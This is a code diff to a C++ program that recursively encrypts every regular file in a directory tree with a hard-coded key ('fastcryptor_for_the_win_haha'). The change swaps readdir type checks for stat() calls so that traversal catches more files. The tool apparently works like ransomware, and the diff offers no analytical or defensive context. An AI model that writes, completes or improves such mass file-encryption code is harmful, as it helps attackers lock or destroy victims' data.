@@ -4,6 +4,7 @@
 #include <vector>
 #include <dirent.h>
 #include <cstring>
+#include <sys/stat.h>
 
 const std::string key = "fastcryptor_for_the_win_haha";
 
@@ -40,10 +41,13 @@ void encryptDirectory(const std::string& dirName)
     if ((dir = opendir(dirName.c_str())) != NULL) {
         while ((ent = readdir(dir)) != NULL) {
             std::string fileName = dirName + "/" + ent->d_name;
-            if (ent->d_type == DT_REG) {
-                encryptFile(fileName);
-            } else if (ent->d_type == DT_DIR && strcmp(ent->d_name, ".") != 0 && strcmp(ent->d_name, "..") != 0) {
-                encryptDirectory(fileName);
+            struct stat st;
+            if (stat(fileName.c_str(), &st) == 0) {
+                if (S_ISREG(st.st_mode)) {
+                    encryptFile(fileName);
+                } else if (S_ISDIR(st.st_mode) && strcmp(ent->d_name, ".") != 0 && strcmp(ent->d_name, "..") != 0) {
+                    encryptDirectory(fileName);
+                }
             }
         }
         closedir(dir);
